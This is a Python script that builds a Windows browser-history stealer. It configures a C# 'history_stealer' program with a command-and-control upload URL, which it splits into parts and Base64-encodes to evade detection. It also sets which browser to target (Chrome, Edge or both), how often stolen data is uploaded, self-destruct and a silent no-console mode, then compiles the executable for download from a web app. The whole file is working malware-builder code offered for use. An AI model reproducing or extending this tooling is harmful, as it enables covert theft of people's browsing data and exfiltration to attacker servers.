#!/usr/bin/env python3
import os
import subprocess
import re
import base64

def build_executable(exe_name, upload_url, target_browser, upload_interval, self_destruct, silent, output_dir="/app/webapp/static/builds"):
    """
    Build the C# executable with specified configuration.
    
    Args:
        exe_name (str): Name of the output executable (e.g., steal.exe)
        upload_url (str): The C2 URL for uploads
        target_browser (int): 0=Chrome, 1=Edge, 2=Both
        upload_interval (int): Hours between uploads (0 for once)
        self_destruct (bool): Enable self-destruction
        silent (bool): Compile as Windows app (no console)
        output_dir (str): Directory to save the compiled executable
    
    Returns:
        tuple: (bool, str) - (Success status, Output filename or error message)
    """
    base_dir = os.path.dirname(os.path.abspath(__file__))
    source_file = os.path.join(base_dir, "..", "history_stealer", "Program.cs")
    temp_file = os.path.join(base_dir, f"Program_temp_{os.urandom(8).hex()}.cs")
    output_exe = os.path.join(output_dir, exe_name)

    print(f"Building executable: {exe_name}")
    print(f"Source file: {source_file}")
    print(f"Output executable: {output_exe}")

    if not upload_url.startswith(("http://", "https://")):
        print("Error: Upload URL must start with http:// or https://")
        return False, "Upload URL must start with http:// or https://"
    if target_browser not in [0, 1, 2]:
        print("Error: Target browser must be 0 (Chrome), 1 (Edge), or 2 (Both)")
        return False, "Target browser must be 0 (Chrome), 1 (Edge), or 2 (Both)"
    if not isinstance(upload_interval, int) or upload_interval < 0:
        print("Error: Upload interval must be a non-negative integer")
        return False, "Upload interval must be a non-negative integer"
    if not os.path.exists(source_file):
        print(f"Error: Source file not found: {source_file}")
        return False, f"Source file {source_file} not found"

    target_map = {0: "CHROME", 1: "EDGE", 2: "BOTH"}
    target = target_map[target_browser]
    print(f"Target browser: {target}")

    print(f"Ensuring output directory exists: {output_dir}")
    os.makedirs(output_dir, exist_ok=True)

    try:
        with open(source_file, "r") as f:
            content = f.read()
        print(f"Read source file: {source_file}")
    except Exception as e:
        print(f"Error: Failed to read {source_file}: {str(e)}")
        return False, f"Failed to read {source_file}: {str(e)}"

    # Split the URL into three unequal parts
    url_length = len(upload_url)
    part1_end = url_length // 4  # Roughly first 25%
    part2_end = url_length * 3 // 4  # Next 50%
    part1 = upload_url[:part1_end]
    part2 = upload_url[part1_end:part2_end]
    part3 = upload_url[part2_end:]
    
    # Base64 encode each part
    part1_b64 = base64.b64encode(part1.encode('utf-8')).decode('utf-8')
    part2_b64 = base64.b64encode(part2.encode('utf-8')).decode('utf-8')
    part3_b64 = base64.b64encode(part3.encode('utf-8')).decode('utf-8')

    # Replace the placeholder variables
    content = re.sub(
        r'private static readonly string C2Part1 = "[^"]*";',
        f'private static readonly string C2Part1 = "{part1_b64}";',
        content
    )
    content = re.sub(
        r'private static readonly string C2Part2 = "[^"]*";',
        f'private static readonly string C2Part2 = "{part2_b64}";',
        content
    )
    content = re.sub(
        r'private static readonly string C2Part3 = "[^"]*";',
        f'private static readonly string C2Part3 = "{part3_b64}";',
        content
    )
    content = re.sub(
        r'public static readonly string Target = "[^"]*";',
        f'public static readonly string Target = "{target}";',
        content
    )
    content = re.sub(
        r'public static readonly int Hours = \d+;',
        f'public static readonly int Hours = {upload_interval};',
        content
    )
    content = re.sub(
        r'public static readonly bool SelfDestruct = (true|false);',
        f'public static readonly bool SelfDestruct = {str(self_destruct).lower()};',
        content
    )

    try:
        with open(temp_file, "w") as f:
            f.write(content)
        print(f"Wrote temporary file: {temp_file}")
    except Exception as e:
        print(f"Error: Failed to write temporary file: {str(e)}")
        return False, f"Failed to write temporary file: {str(e)}"

    mcs_command = [
        "mcs",
        "-sdk:4.5",
        f"-target:{'winexe' if silent else 'exe'}",
        f"-out:{output_exe}",
        "-platform:x64",
        "-r:/usr/lib/mono/4.5/System.Net.Http.dll",
        "-r:/usr/lib/mono/4.5/System.IO.Compression.dll",
        "-r:/usr/lib/mono/4.5/System.IO.Compression.FileSystem.dll",
        "-langversion:7.1",
        temp_file
    ]
    print(f"Running mcs command: {' '.join(mcs_command)}")

    try:
        result = subprocess.run(mcs_command, check=True, capture_output=True, text=True)
        print(f"Compilation successful: {output_exe}")
        return True, output_exe
    except subprocess.CalledProcessError as e:
        print(f"Error: Compilation failed: {e.stderr}")
        return False, f"Compilation failed: {e.stderr}"
    except FileNotFoundError:
        print("Error: mcs compiler not found")
        return False, "mcs compiler not found. Install mono-complete with 'sudo apt install mono-complete'"
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)
            print(f"Removed temporary file: {temp_file}")